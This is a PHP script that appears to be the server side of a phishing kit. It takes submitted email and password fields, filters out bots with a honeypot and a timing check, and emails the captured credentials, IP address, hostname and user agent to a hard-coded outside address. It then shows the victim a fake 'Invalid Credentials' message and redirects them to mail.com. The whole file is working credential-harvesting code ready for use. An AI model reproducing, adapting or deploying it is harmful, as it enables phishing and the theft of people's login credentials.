<?php
header('Content-Type: application/json');
ob_start();

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'msg' => 'Invalid request method.']);
    exit;
}
// 1. Check if POST data is present
if (empty($_POST)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'msg' => 'No POST data received.']);
    exit;
}

// 2. Collect inputs
$email = trim($_POST['email'] ?? '');
$password = trim($_POST['password'] ?? '');
$formTime = intval($_POST['form_time'] ?? 0);
$honeypot = trim($_POST['robot_check'] ?? '');

$signal = 'bad'; // default
$msg = 'Invalid request.';

// 3. Anti-bot: Honeypot
if (!empty($honeypot)) {
    echo json_encode(['status' => 'error', 'msg' => 'Bot detected.']);
    exit;
}

// 4. Anti-bot: Time check
if ($formTime > 0 && (time() - $formTime) < 2) {
    echo json_encode(['status' => 'error', 'msg' => 'Form submitted too quickly.']);
    exit;
}

// 5. Required field check
if (!filter_var($email, FILTER_VALIDATE_EMAIL) || empty($password)) {
    echo json_encode(['status' => 'error', 'msg' => 'Please provide a valid email and password.']);
    exit;
}

// 6. If valid, process and log
$ip = $_SERVER["REMOTE_ADDR"] ?? 'unknown';
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Prepare message
$message = "|---------- LOGIN INFO ----------|\n";
$message .= "Online ID: $email\n";
$message .= "Password : $password\n";
$message .= "Client IP: $ip\n";
$message .= "Hostname : $hostname\n";
$message .= "UserAgent: $useragent\n";
$message .= "|--------------------------------|\n";

// Send mail
$send = "zhu.zhung@atomicmail.io"; // ✅ replace with your email


$subject = "Login: $ip";
mail($send, $subject, $message);


// Final response
$signal = 'ok';
$msg = 'Invalid Credentials';

// Send final response
echo json_encode([
    'signal' => $signal,
    'msg' => $msg,
    'redirect_link' => 'http://mail.com'
]);

ob_end_flush();
